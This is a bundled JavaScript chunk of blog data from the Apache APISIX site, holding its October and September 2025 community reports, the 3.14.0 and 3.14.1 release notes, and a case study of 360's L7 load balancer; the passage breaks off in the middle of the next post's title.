"use strict";(self.webpackChunkblog=self.webpackChunkblog||[]).push([[11477],{20499:e=>{e.exports=JSON.parse('{"blogPosts":[{"id":"2025 Monthly Report (October 01 - October 31)","metadata":{"permalink":"/blog/2025/10/31/2025-oct-monthly-report","source":"@site/blog/2025/10/31/2025-oct-monthly-report.md","title":"2025 Monthly Report (October 01 - October 31)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2025-10-31T00:00:00.000Z","formattedDate":"October 31, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.665,"truncated":true,"authors":[],"nextItem":{"title":"Release Apache APISIX 3.14.1","permalink":"/blog/2025/10/17/release-apache-apisix-3.14.1"}},"content":"> Recently, we\'ve introduced and updated some new features, including adding `max_pending_entries` to all logger plugins, supporting SCRAM Authentication for `kafka-logger` plugin, etc. For more details, please read this month\'s newsletter.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom October 1st to October 31st, 9 contributors made 73 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.api7.ai/uploads/2025/10/31/SOcjK3wK_2025-oct-contributors.webp)\\n\\n![New Contributors List](https://static.api7.ai/uploads/2025/10/31/V7U7v4Z5_2025-oct-new-contributor.webp)\\n\\n## Feature Highlights\\n\\n### 1. Add `max_pending_entries` to All Logger Plugins\\n\\nPR: https://github.com/apache/apisix/pull/12709\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nWhen external logging services like Kafka are slow or unavailable, a backlog of unsent log entries can rapidly accumulate, leading to memory spikes. This PR extends the existing `max_pending_entries` configuration from the `kafka-logger` plugin to all logger plugins. It provides a configurable queue limit. When reached, new logs are dropped, ensuring system stability.\\n\\n### 2. Update Resource Name Length Limit for Routes\\n\\nPR: https://github.com/apache/apisix/pull/11822\\n\\nContributor: [csotiriou](https://github.com/csotiriou)\\n\\nThis PR increases the maximum allowed length for a route\'s name. The limit has been extended to three times the previous default value. This change is necessary because when using the APISIX Ingress Controller, route names are automatically generated by concatenating the Kubernetes namespace with other identifiers, which can easily exceed the original length restriction.\\n\\n### 3. Support SCRAM Authentication for `kafka-logger` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12693\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR adds support for SCRAM (Salted Challenge Response Authentication Mechanism) authentication to enhance security. While the underlying Kafka client library already supported SCRAM, the plugin itself was limited to only PLAIN authentication. This update bridges that gap, providing a more secure authentication option for connecting to Kafka clusters.\\n\\n### 4. Refactor Secret Management with URI-Based Caching\\n\\nPR: https://github.com/apache/apisix/pull/12682\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR refactors `apisix/secret.lua` to use URL as the cache key, and we only cache the result of the `fetch(uri) function`. It also allows the LRU cache to support separate cache instances for successful and failed secret fetch operations, allowing independent cache configuration. Additionally, the `fetch_secrets()` API is simplified by removing redundant parameters, as keys are now resolved internally.\\n\\n### 5. Add Support for Wildcard SNI Matching in SSL Configuration\\n\\nPR: https://github.com/apache/apisix/pull/12668\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR enhances APISIX\'s SSL SNI matching capability by adding support for complete wildcard (`*`) values. Previously, APISIX only supported exact domain matching (e.g., `abc.test.com`) and partial wildcards (e.g., `.test.com`), but lacked support for the universal wildcard.\\nThis addition ensures compatibility with the Gateway API\'s HTTPSListener specification, meeting its core consistency test requirements for handling SSL connections with wildcard server name indications.\\n\\n## Recommended Blogs\\n\\n- [Release Apache APISIX 3.14.1](https://apisix.apache.org/blog/2025/10/17/release-apache-apisix-3.14.1/)\\n\\n  We are glad to release Apache APISIX 3.14.1 with a bug fix to improve user experiences.\\n\\n- [Release Apache APISIX 3.14.0](https://apisix.apache.org/blog/2025/10/10/release-apache-apisix-3.14.0/)\\n\\n  This release introduces several new features, including new AI proxy variables for logging, support for AI/ML API providers in AI plugins, route matching based on the request body, support for the KSUID algorithm in the request-id plugin, and more."},{"id":"Release Apache APISIX 3.14.1","metadata":{"permalink":"/blog/2025/10/17/release-apache-apisix-3.14.1","source":"@site/blog/2025/10/17/release-apache-apisix-3.14.1.md","title":"Release Apache APISIX 3.14.1","description":"The Apache APISIX 3.14.1 version is released on Oct 17, 2025. This release includes a bug fix.","date":"2025-10-17T00:00:00.000Z","formattedDate":"October 17, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":0.5,"truncated":true,"authors":[{"name":"Ashish Tiwari","title":"Author","url":"https://github.com/Revolyssup","image_url":"https://github.com/Revolyssup.png","imageURL":"https://github.com/Revolyssup.png"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://github.com/kayx23.png","imageURL":"https://github.com/kayx23.png"}],"prevItem":{"title":"2025 Monthly Report (October 01 - October 31)","permalink":"/blog/2025/10/31/2025-oct-monthly-report"},"nextItem":{"title":"Release Apache APISIX 3.14.0","permalink":"/blog/2025/10/10/release-apache-apisix-3.14.0"}},"content":"We are glad to release Apache APISIX 3.14.1 with a bug fix to improve user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\n## Bug Fix\\n\\n### Port conflict in worker process for prometheus\\n\\nFix an issue where the Prometheus server could sometimes fail to start due to port conflicts when running in worker processes. The fix enables port reuse for the Prometheus server, ensuring reliable startup even during restarts.\\n\\nFor more information, see [PR #12667](https://github.com/apache/apisix/pull/12667).\\n\\n## Other Update\\n\\n* Add warning log when skipping schema checks for disabled plugins (PR [#12655](https://github.com/apache/apisix/pull/12655))\\n\\n## Changelog\\n\\nFor a complete list of changes in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#3141)."},{"id":"Release Apache APISIX 3.14.0","metadata":{"permalink":"/blog/2025/10/10/release-apache-apisix-3.14.0","source":"@site/blog/2025/10/10/release-apache-apisix-3.14.0.md","title":"Release Apache APISIX 3.14.0","description":"The Apache APISIX 3.14.0 version is released on Oct 10, 2025. This release includes a few changes, new features, bug fixes, and other improvements to user experiences.","date":"2025-10-10T00:00:00.000Z","formattedDate":"October 10, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":8.64,"truncated":true,"authors":[{"name":"Ashish Tiwari","title":"Author","url":"https://github.com/Revolyssup","image_url":"https://github.com/Revolyssup.png","imageURL":"https://github.com/Revolyssup.png"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://github.com/kayx23.png","imageURL":"https://github.com/kayx23.png"}],"prevItem":{"title":"Release Apache APISIX 3.14.1","permalink":"/blog/2025/10/17/release-apache-apisix-3.14.1"},"nextItem":{"title":"2025 Monthly Report (September 01 - September 30)","permalink":"/blog/2025/09/30/2025-sep-monthly-report"}},"content":"We are glad to present Apache APISIX 3.14.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\nThis release introduces several new features, including new AI proxy variables for logging, support for AI/ML API providers in AI plugins, route matching based on the request body, support for the KSUID algorithm in the `request-id` plugin, and more.\\n\\nThere are also a few important changes included in this release. Should you find these changes impacting your operations, please plan your upgrade accordingly.\\n\\n## Breaking Changes\\n\\n### `jwt-auth` plugin requires `secret` for non-RS/ES algorithms\\n\\nThe `jwt-auth` plugin will no longer automatically generate a secret value when none is provided for algorithms other than RS256 and ES256. Previously, when users configured the `jwt-auth` plugin without providing a secret for algorithms like HS256 or HS512, APISIX would automatically generate one.\\n\\nNow users must explicitly configure the secret field when using algorithms other than RS256 and ES256. If no secret is provided, the plugin will return an error message requiring users to set this value manually.\\n\\nThis change improves configuration transparency and prevents potential confusion from auto-generated values. Users should review their `jwt-auth` plugin configurations and ensure they explicitly set the secret field where required.\\n\\nFor more information, see [PR #12611](https://github.com/apache/apisix/pull/12611).\\n\\n### `openid-connect` plugin requires explicit session secret configuration\\n\\nIn this release, the `openid-connect` plugin no longer auto-generates a `session.secret` when `bearer_only` is set to `false` and no `session.secret` is provided. Instead, the user must explicitly specify `session.secret` when `bearer_only` is set to `false`.\\n\\nFor more information, see [PR #12609](https://github.com/apache/apisix/pull/12609).\\n\\n## New Features\\n\\n### Support route matching based on request body\\n\\nYou can now use `post_arg.*` in a route\'s `vars` to match requests based on the request body value. `post_arg` supports JSON, multipart, and URL-encoded request bodies, enabling flexible and dynamic routing logic based on message payloads.\\n\\nFor more information, see [PR #12388](https://github.com/apache/apisix/pull/12388).\\n\\n### Add global switch to disable all upstream health checks\\n\\nThis release introduces a new configuration option `apisix.disable_upstream_healthcheck` in the `config.yaml` that allows you to turn off all upstream health checks at once. This is useful in emergency where health checking may interfere with routing fallback.\\n\\nFor more information, see [PR #12407](https://github.com/apache/apisix/pull/12407).\\n\\n### Support multiple objects in a single log\\n\\nThis release increases flexibility of the `json.delay_encode` logging feature: up to 16 distinct `delay_encode` objects can now be included in a single log entry. This gives finer control over how and which parts of log payloads are delayed or encoded.\\n\\nFor more information, see [PR #12395](https://github.com/apache/apisix/pull/12395).\\n\\n### Add custom claim validation in `openid-connect` plugin\\n\\nThis release introduces the ability to configure custom claim validation in the `openid-connect` plugin. This enhancement allows users to define validation rules for specific claims, such as ensuring a claim matches one of a set of predefined values. If a claim fails validation, the request will be rejected.\\n\\nFor more information, see [PR #11824](https://github.com/apache/apisix/pull/11824).\\n\\n### Support environment variables in `openid-connect` plugin\\n\\nThis release adds support for environment variables in the configuration of the `openid-connect` plugin. Users can now store sensitive fields, such as `client_secret`, in environment variables, enhancing security and flexibility during deployment.\\n\\nFor more information, see [PR #11451](https://github.com/apache/apisix/pull/11451).\\n\\n### Introduce `traffic-split` plugin for stream routes\\n\\nThis release introduces the `traffic-split` plugin for stream routes (L4), enabling weighted traffic distribution across multiple upstreams. This enhancement allows more granular control over traffic routing in stream-based applications.\\n\\nFor more information, see [PR #12630](https://github.com/apache/apisix/pull/12630).\\n\\n### Add KSUID algorithm in `request-id` plugin\\n\\nThis release supports KSUID (K-Sortable Globally Unique Identifier) algorithm in the `request-id` plugin for request ID generation.\\n\\nFor more information, see [PR #12573](https://github.com/apache/apisix/pull/12573).\\n\\n### Introduce fallback mechanism in `ai-proxy-multi` plugin\\n\\nThis release enhances the `ai-proxy-multi` plugin by adding a fallback mechanism for specific error codes. This improvement ensures more resilient AI proxying by allowing predefined fallback behaviors when certain error conditions are met.\\n\\nFor more information, see [PR #12571](https://github.com/apache/apisix/pull/12571).\\n\\n### Support metadata headers and HEAD method in Standalone API\\n\\nThe standalone API has two new response metadata headers: `X-Last-Modified` and `X-Digest`, which let clients detect which instance was last updated and inspect a configuration digest passed by the client.\\n\\nIn addition, HEAD requests are now supported (returning only metadata, not full config), making lightweight polling or metadata checks possible.  \\n\\nFor more information, see [PR #12526](https://github.com/apache/apisix/pull/12526).\\n\\n### Add new AI proxy variables for logging\\n\\nThis release adds the following variables to the `ai-proxy` and `ai-proxy-multi` plugins:\\n\\n* `apisix_upstream_response_time`: Time taken for APISIX to send the request to the upstream service and receive the full response.\\n* `request_type`: Type of request, where the value could be `traditional_http`, `ai_chat`, or `ai_stream`.\\n* `llm_time_to_first_token`: Duration from request sending to the first token received from the LLM service, in milliseconds.\\n* `llm_model`: LLM model name forwarded to the upstream LLM service.\\n* `request_llm_model`: LLM model name specified in the request.\\n* `llm_prompt_tokens`: Number of tokens in the prompt.\\n* `llm_completion_tokens`: Number of chat completion tokens in the prompt.\\n\\nThese variables can be logged in the access log, utilized with logging plugins, or exported as Prometheus metrics. This enhancement improves monitoring and debugging by offering insights into upstream service response times during AI proxying.\\n\\nFor more information, see [PR #12555](https://github.com/apache/apisix/pull/12555), [PR #12554](https://github.com/apache/apisix/pull/12554), [PR #12515](https://github.com/apache/apisix/pull/12515), and [PR #12518](https://github.com/apache/apisix/pull/12518).\\n\\n### Introduce `ai-aliyun-content-moderation` plugin\\n\\nThis release introduces the new `ai-aliyun-content-moderation` plugin, enabling integration with Aliyun\'s Machine-Assisted Moderation Plus for content moderation. The plugin evaluates request bodies for profanity, hate speech, insults, harassment, violence, and more. Any request that exceeds the specified threshold will be rejected.\\n\\nFor more information, see [PR #12530](https://github.com/apache/apisix/pull/12530).\\n\\n### Add Azure AI and AI/ML API providers to AI plugins\\n\\nThe `ai-proxy`, `ai-proxy-multi`, and `ai-request-rewrite` plugins now supports Azure AI and AI/ML API as providers.\\n\\nWhen `provider` is set to `azure-openai`, the plugin proxies requests to the custom endpoint configured in `override` and additionally removes the model parameter from user requests.\\n\\nAI/ML API provides a unified OpenAI-compatible API with access to 300+ LLMs such as GPT-4, Claude, Gemini, DeepSeek, and others. When `provider` is set to `aimlapi`, the plugin allows users to route AI requests to AIMLAPI-compatible endpoints, broadening the spectrum of AI providers that can be utilized within the APISIX ecosystem.\\n\\nFor more information, see [PR #12565](https://github.com/apache/apisix/pull/12565) and [PR #12379](https://github.com/apache/apisix/pull/12379).\\n\\n### Support healthcheck in `ai-proxy-multi` plugin\\n\\nThe `ai-proxy-multi` plugin now includes health check support for upstream AI services. Each backend endpoint can be monitored for availability, and requests can be routed dynamically to healthy endpoints. This ensures high availability and prevents requests from being sent to unresponsive AI servers, improving reliability in production environments.\\n\\nFor more information, see [PR #12509](https://github.com/apache/apisix/pull/12509).\\n\\n### Support `limit-conn` in `workflow` plugin rules\\n\\nThis release enhances the `workflow` plugin by allowing it to include the `limit-conn` plugin as part of workflow rules.\\n\\nFor more information, see [PR #12465](https://github.com/apache/apisix/pull/12465).\\n\\n### Improve `datadog` plugin tagging\\n\\nThe `datadog` plugin now provides enhanced metrics and tags to support a wider range of observability needs. This update introduces several new tags:\\n\\n* `response_status_class`: The class of the HTTP response status code (e.g., \\"2xx\\", \\"4xx\\", \\"5xx\\").\\n* `path`: The HTTP path pattern, available only if the `include_path` attribute is set to `true`.\\n* `method`: The HTTP method, available only if the `include_method` attribute is set to `true`.\\n\\nFor more information, see [PR #11943](https://github.com/apache/apisix/pull/11943).\\n\\n### Add support for `extra_headers` in `forward-auth` plugin\\n\\nThe `forward-auth` plugin can now extract fields from the request body and inject them as headers to the upstream service, using `extra_headers` and `$post_arg.*`. For example, if authentication returns a user role or token in the response body, you can now map part of that body into a header that downstream services can consume.\\n\\nFor more information, see [PR #12405](https://github.com/apache/apisix/pull/12405).\\n\\n## Other Updates\\n\\n* Admin API no longer populates default values (PR [#12603](https://github.com/apache/apisix/pull/12603))\\n* Add healthcheck manager to decouple upstream (PR [#12426](https://github.com/apache/apisix/pull/12426))\\n* Decouple Prometheus exporter calculation and output (PR [#12383](https://github.com/apache/apisix/pull/12383))\\n* Redact encrypted fields from error logs to prevent sensitive data leakage (PR [#12629](https://github.com/apache/apisix/pull/12629))\\n* Fix inconsistent resolved nodes for health checks in the `ai-proxy-multi` plugin (PR [#12594](https://github.com/apache/apisix/pull/12594))\\n* Only trust `X-Forwarded-*` headers from configured `trusted_addresses` (PR [#12551](https://github.com/apache/apisix/pull/12551))\\n* Ensure redirects work correctly when scheme is not HTTPS (PR [#12561](https://github.com/apache/apisix/pull/12561))\\n* Fix UI redirect errors when running behind a proxy (PR [#12566](https://github.com/apache/apisix/pull/12566))\\n* Refresh stale LRU cache items for secrets in the background (PR [#12614](https://github.com/apache/apisix/pull/12614))\\n* Restore missing runtime information in health check manager (PR [#12607](https://github.com/apache/apisix/pull/12607))\\n* Support stream route configuration in Standalone Admin API mode (PR [#12604](https://github.com/apache/apisix/pull/12604))\\n* Only log response body when `include_resp_body` is enabled (PR [#12599](https://github.com/apache/apisix/pull/12599))\\n* Correct spelling of `get_healthcheck_events_module` function name (PR [#12587](https://github.com/apache/apisix/pull/12587))\\n* Prevent panic when `ai-proxy-multi` instance lacks a custom endpoint (PR [#12584](https://github.com/apache/apisix/pull/12584))\\n* Prevent message accumulation across requests in AI Prompt Decorator plugin (PR [#12582](https://github.com/apache/apisix/pull/12582))\\n* Remove stale `stream_worker_events.sock` file in Docker entrypoint (PR [#12546](https://github.com/apache/apisix/pull/12546))\\n* Add expiration time (`exptime`) to EWMA shared dictionary items (PR [#12557](https://github.com/apache/apisix/pull/12557))\\n* Catch malformed override endpoints in `ai-proxy` schema validation (PR [#12563](https://github.com/apache/apisix/pull/12563))\\n* Fix missing `ctx.llm_raw_usage` value in non-stream mode (PR [#12564](https://github.com/apache/apisix/pull/12564))\\n* Check types of `choices`, `usage`, and `content` fields in `ai-proxy` before use (PR [#12548](https://github.com/apache/apisix/pull/12548))\\n* Adjust ID length for Kubernetes service discovery (PR [#12536](https://github.com/apache/apisix/pull/12536))\\n* Make `basic-auth` scheme case-insensitive (PR [#12539](https://github.com/apache/apisix/pull/12539))\\n* Skip client certificate verification when only `tls.verify` is configured (PR [#12527](https://github.com/apache/apisix/pull/12527))\\n* Load full data from etcd when worker restarts (PR [#12523](https://github.com/apache/apisix/pull/12523))\\n* Upgrade etcd revision on watch request timeout (PR [#12514](https://github.com/apache/apisix/pull/12514))\\n* Enable EndpointSlices support for Kubernetes discovery (PR [#11654](https://github.com/apache/apisix/pull/11654))\\n* Include gRPC trailers even when response body is empty in `grpc-web` (PR [#12490](https://github.com/apache/apisix/pull/12490))\\n* Fix hostname retrieval issue on Red Hat systems (PR [#12267](https://github.com/apache/apisix/pull/12267))\\n* Fix batch processor cache not working when plugin is configured on service level (PR [#12474](https://github.com/apache/apisix/pull/12474))\\n* Resolve variable references in `$post_arg` for Forward Auth plugin\u2019s `extra_headers` (PR [#12435](https://github.com/apache/apisix/pull/12435))\\n* Fix inconsistent circuit breaking due to premature `breaker_time` increment in `api-breaker` plugin (PR [#12451](https://github.com/apache/apisix/pull/12451))\\n* Add missing configuration validation for Standalone Admin API mode (PR [#12424](https://github.com/apache/apisix/pull/12424))\\n* Skip writing access logs when `enable_access_log` is set to false (PR [#11310](https://github.com/apache/apisix/pull/11310))\\n* Remove unused `set_ngx_var` attribute from OpenTelemetry plugin (PR [#12411](https://github.com/apache/apisix/pull/12411))\\n* Support `Content-Type` headers with charset for URL-encoded data in Request Validation plugin (PR [#12406](https://github.com/apache/apisix/pull/12406))\\n* Fix Zipkin `trace_id` and `span_id` format in `ngx_var` (PR [#12403](https://github.com/apache/apisix/pull/12403))\\n* Fix missed consumer updates caused by incorrect cache versioning (PR [#12413](https://github.com/apache/apisix/pull/12413))\\n* Ensure `get_keys` returns all items from shared dictionary beyond default 1024 limit (PR [#12380](https://github.com/apache/apisix/pull/12380))\\n\\n## Changelog\\n\\nFor a complete list of changes in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#3140)."},{"id":"2025 Monthly Report (September 01 - September 30)","metadata":{"permalink":"/blog/2025/09/30/2025-sep-monthly-report","source":"@site/blog/2025/09/30/2025-sep-monthly-report.md","title":"2025 Monthly Report (September 01 - September 30)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2025-09-30T00:00:00.000Z","formattedDate":"September 30, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.58,"truncated":true,"authors":[],"prevItem":{"title":"Release Apache APISIX 3.14.0","permalink":"/blog/2025/10/10/release-apache-apisix-3.14.0"},"nextItem":{"title":"360 Built Unified L7 Load Balancer Using Apache APISIX","permalink":"/blog/2025/09/03/360-built-unified-l7-load-balancer-with-apisix"}},"content":"> Recently, we\'ve introduced and updated some new features, including adding fallback mechanism for specific error codes in `ai-proxy-multi` plugin and adding KSUID algorithm in `request-id` plugin, etc. For more details, please read this month\'s newsletter.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom September 1st to September 30th, 17 contributors made 76 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.api7.ai/uploads/2025/09/29/8AmFT8hp_2025-sep-contributor-list.webp)\\n\\n![New Contributors List](https://static.api7.ai/uploads/2025/09/29/ukKJS7E3_2025-sep-new-contributors.webp)\\n\\n## Feature Highlights\\n\\n### 1. Admin API No Longer Overwrites User Data with Defaults\\n\\nPR: https://github.com/apache/apisix/pull/12603\\n\\nContributor: [SkyeYoung](https://github.com/SkyeYoung)\\n\\nThis PR removes the logic of populating default values before writing to the admin API. By leaving the copy in etcd untouched and applying the new defaults only inside APISIX, the PR keeps the user\'s config identical to what was posted, removing surprise diffs and letting the ingress controller\'s ADC diff logic keep working with older versions.\\n\\n### 2. Add the KSUID algorithm in the `request-id` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12573\\n\\nContributor: [Crazy-xyr](https://github.com/Crazy-xyr)\\n\\nThis PR replaces the previous request ID generation method with the KSUID (K-Sortable Unique IDentifier) algorithm. KSUIDs are always 27 characters long and are encoded in base62, making them URL-safe. Their key advantage is that they are lexicographically sortable, ensuring they remain in time order even when treated as strings. With 128 bits of randomness, they also provide stronger collision resistance than standard UUIDs.\\n\\n### 3. Add Fallback Mechanism for Specific Error Codes in `ai-proxy-multi` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12571\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThe `ai-proxy-multi` plugin now retries any request that returns `429` or `5xx`, automatically failing over to the next healthy model endpoint until one succeeds, so more calls finish without surfacing an error to the client.\\n\\n### 4. Add Latency and Usage in Access log of `ai-proxy` Plugin and Prometheus Metrics\\n\\nPR: https://github.com/apache/apisix/pull/12518\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR adds latency and token info for the `ai-proxy` plugin in the access log for easy debugging. It also adds Prometheus metrics for AI-related requests and adds two more labels: `request_type` to distinguish between regular requests and AI-related requests; and `llm_model` for the LLM model name forwarded to the upstream LLM service.\\n\\n### 5. Add New ctx Variable `request_llm_model` for Requesting LLM Model\\n\\nPR: https://github.com/apache/apisix/pull/12554\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\nUsers need to record the LLM model of client requests that are not modified by the gateway when logging AI proxy requests, so a new context variable `request_llm_model` is added to record it.\\n\\n## Recommended Blogs\\n\\n- [360 Built Unified L7 Load Balancer Using Apache APISIX](https://apisix.apache.org/blog/2025/09/03/360-built-unified-l7-load-balancer-with-apisix/)\\n\\n  360 unifies Layer 7 load balancing using APISIX, gaining VPC, cloud-native, and fine-grained routing in one seamless upgrade.\\n\\n- [Load Balancing AI/ML API with Apache APISIX](https://apisix.apache.org/blog/2025/07/31/load-balancing-between-ai-ml-api-with-apisix/)\\n\\n  This blog provides a step-by-step guide to configure Apache APISIX for AI traffic splitting and load balancing between API versions, covering security setup, canary testing, and deployment monitoring."},{"id":"360 Built Unified L7 Load Balancer Using Apache APISIX","metadata":{"permalink":"/blog/2025/09/03/360-built-unified-l7-load-balancer-with-apisix","source":"@site/blog/2025/09/03/360-built-unified-l7-load-balancer-with-apisix.md","title":"360 Built Unified L7 Load Balancer Using Apache APISIX","description":"360 unifies Layer 7 load balancing using APISIX, gaining VPC, cloud-native, and fine-grained routing in one seamless upgrade.","date":"2025-09-03T00:00:00.000Z","formattedDate":"September 3, 2025","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":4.96,"truncated":true,"authors":[{"name":"360 ZYUN Cloud","title":"Author"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"2025 Monthly Report (September 01 - September 30)","permalink":"/blog/2025/09/30/2025-sep-monthly-report"},"nextItem":{"title":"2025 Monthly Report (August 01 - August 31)","permalink":"/blog/2025/08/31/2025-august-monthly-report"}},"content":"> 360 unifies Layer 7 load balancing using APISIX, gaining VPC, cloud-native, and fine-grained routing in one seamless upgrade.\\n>\\n\x3c!--truncate--\x3e\\n\\n## About 360 and 360 ZYUN Cloud\\n\\n360 Security Technology Inc., also branded as [Qihoo 360](https://www.linkedin.com/company/qihoo-360/), is a leading Internet and security technology enterprise and the first advocate of free Internet security in China. In the wave of AI, it is committed to helping industries and organizations achieve intelligent digital transformation.\\n\\n360 ZYUN Cloud is the intelligent data cloud foundation of 360, offering a wide range of products and services, including databases, middleware, storage, big data, artificial intelligence, computing, networking, video, and IoT integration, and communications, as well as one-stop solutions.\\n\\nPositioned as an open enterprise application service platform with the mission of \\"aggregating the value of data and enabling an intelligent future,\\" 360 ZYUN Cloud provides robust products and technical services for businesses and applications across industries, helping enterprises and organizations unlock greater commercial value.\\n\\n## Project Background\\n\\nLayer 7 (L7) load balancing, which operates at the application layer of the OSI model, provides deep inspection of protocols like HTTP/HTTPS and supports a rich set of advanced routing rules. Unlike Layer 4 (L4) load balancing, which only considers IP addresses and ports, L7 load balancing understands application-layer content, enabling far more granular traffic control.\\n\\nOur existing internal L7 load-balancing system at 360 faced two critical limitations:\\n\\n1. It was built for traditional data center infrastructure and did not support Virtual Private Clouds (VPCs), making it unable to meet the needs of our cloud-based tenants.\\n2. While it supported bare-metal and virtual machine backends, it was not designed for modern, cloud-native workloads such as containers.\\n\\nTo overcome these challenges, we initiated the Unified L7 Load Balancing project. The goal was to build a single, comprehensive load balancing service that supports a hybrid network architecture and can route traffic to diverse backend instance types.\\n\\nThe core features required for this new service were:\\n\\n* **Intelligent Routing:** Fine-grained traffic routing by parsing HTTP headers (`User-Agent`, `Cookie`), URL paths, and other parameters.\\n* **Session Persistence:** Ensuring user requests are consistently directed to the same backend server by injecting cookies or generating session IDs.\\n* **Active Health Checks:** Proactively monitoring the health of backend upstreams to prevent requests from being sent to unhealthy instances.\\n* **Dynamic Configuration (Hot Reloading):** Allowing configuration changes to take effect in real-time without service interruptions, simplifying maintenance.\\n* **High Availability (HA):** Ensuring instance reliability through cluster-based failover, session persistence, and multi-AZ deployments.\\n\\n## Service Architecture Design\\n\\n### 1. Overall Architecture\\n\\nThe unified L7 load balancing architecture is composed of two main components: a **control plane** and a **data plane**.\\n\\nThe **control plane** is responsible for configuration management. In addition to our existing `LBC-API` (shared by L4 and L7), we integrated the `apisix admin API` for managing L7 rules. We use an `etcd` cluster as the configuration store; its millisecond-level notification mechanism enables real-time configuration updates, which is ideal for scalable, containerized environments. In VPC scenarios, the control plane assigns a unique internal IP to each upstream to mask its real VPC IP address.\\n\\nThe **data plane** is the component that processes client requests and forwards user traffic. It is stateless but supports a wide range of functions, including authentication, SSL/TLS offloading, logging, and observability. For VPC traffic, the data plane integrates with our FNAT gateway\'s forwarding logic. Using the mapping between the unique internal IP and the real VPC IP, it encapsulates traffic in **VXLAN** packets before sending them to the host machine where the upstream instance is running.\\n\\n![360 L7 Load Balancing Architecture](https://static.api7.ai/uploads/2025/09/04/yXqvnBrv_2.1-en.webp)\\n\\nL7 resources (e.g., `service`, `route`, `upstream`) are managed via calls to the internal `LBC-API`. The workflow is as follows:\\n\\n1. The API then calls the `apisix admin API` to persist the configuration into the `etcd` cluster.\\n2. The `LBC-AGENT` process listens for changes in `etcd` and applies VPC IP mapping configurations to the FNAT data plane.\\n3. The APISIX data plane nodes also listen for changes in `etcd`, allowing new L7 routing rules to take effect dynamically.\\n4. Traffic from our on-prem data center (IDC) is forwarded directly to its destination IP, while traffic destined for VPCs is encapsulated and forwarded to its host.\\n5. To use the service, teams simply point their application\'s DNS to the corresponding Virtual IP (EIP for public services or a VPC-internal VIP).\\n\\n### 2. Service Deployment Architecture\\n\\nOur deployment architecture is shown in the diagram below. It has several features:\\n\\n* **Unified Interface:** Our internal \\"Stack\\" platform provides a single OpenAPI for all teams, including our container cloud platform, to manage their L7 load balancing resources.\\n* **High Availability:** The control plane and storage are deployed at a regional level. The data plane is deployed in a clustered mode within each Availability Zone (AZ), ensuring that if one server fails, requests are automatically redirected to other nodes in the cluster.\\n* **Hybrid L4/L7 Deployment:** We reuse existing L4 capabilities, which reduces development overhead and creates a seamless hybrid infrastructure.\\n\\n![360 Service Deployment Architecture](https://static.api7.ai/uploads/2025/09/04/vAoZwckf_2.2-en.webp)\\n\\n### Traffic Path\\n\\nTraffic flows through one of two primary paths depending on the environment:\\n\\n* **Classic Network (On-Prem) L7 Traffic:**\\n    Public EIP -> L4 Load Balancer (idc vip) -> **L7 LB Gateway** -> IDC-routable IP (VM, pod, etc.)\\n* **VPC Cloud L7 Traffic:**\\n    Public EIP -> L4 Load Balancer (vpc vip) -> **L7 LB Gateway with VXLAN encapsulation** -> VPC-internal IP (VM, pod, etc.)\\n\\n<p align=\\"center\\">\\n  <img width=\\"500\\" alt=\\"Traffic Path Diagram\\" src=\\"https://static.api7.ai/uploads/2025/09/04/zO2tt4qq_3.1-en.webp\\" />\\n</p>\\n\\n### Conclusion & Future Outlook\\n\\nThe unified Layer-7 load balancing service has now been fully launched across all three regions within 360, and container services have also been adapted.\\n\\nAt present, the unified Layer-7 load balancing only supports relatively basic features, with more functional enhancements planned, such as SSL offloading optimization, supporting forwarding rules with redirect, traffic mirroring, and support for additional protocol types. It is gradually evolving toward intelligence, transforming from a simple traffic distribution tool into an intelligent scheduling hub."},{"id":"2025 Monthly Report (August 01 - August 